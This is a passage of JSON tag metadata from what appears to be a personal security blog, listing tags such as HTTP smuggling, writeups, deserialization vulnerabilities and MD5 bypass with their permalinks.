smuggling","slug":"http-smuggling","permalink":"https://123-prog.github.io/tags/http-smuggling/"},{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/tags/wp/"},{"name":"http请求头","slug":"http请求头","permalink":"https://123-prog.github.io/tags/http%E8%AF%B7%E6%B1%82%E5%A4%B4/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://123-prog.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"md5绕过","slug":"md5绕过","permalink":"https://123-prog.github.io/tags/md5%E7%BB%95%E8%BF%87/"},{"name":"其他","slug":"其他","permalink":"https://123-prog.github.io/tags/%E5%85%B6%E4%BB%96/"}]}